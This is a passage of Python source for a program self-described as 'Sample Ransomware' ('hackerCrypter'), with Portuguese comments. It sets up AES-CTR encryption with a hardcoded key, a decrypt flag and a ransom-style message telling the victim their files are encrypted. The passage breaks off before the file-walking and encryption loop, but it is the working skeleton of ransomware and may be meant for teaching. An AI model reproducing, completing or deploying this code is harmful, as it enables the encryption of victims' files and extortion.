# -*- coding: utf 8 -*-

from email import parser
from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import os
import Discovery
import Crypter

# --------------
# A senha pode ter os seguintes tamanhos
# 128/192/256 bits | cada caracter consome 8 bits = 1 byte = 1 letra unicode
# Logo para o valor maximo seria 256/8 = 32 caracteres
#---------------

HARDCODED_KEY = 'senha de teste nao chore'

def get_parser():
    parser = argparse.ArgumentParser(description="hackerCrypter")
    parser.add_argument('-d', '--decrypt', help='decripta os arquivos [default: no]', action='store_true')
    return parser

def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        print('''
        Sample Ransomware
        --------------------------
        Seus arquivos foram criptografados.
        Para decripta-los utilze a seguinte senha '{}'
        '''.format(HARDCODED_KEY))

        key = input('Digite a senha: ')

    else:
        if HARDCODED_KEY:
            key = HARDCODED_KEY


    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

    if not decrypt:
        cryptFn = crypt.encrypt
    else:
        cryptFn = crypt.decrypt


    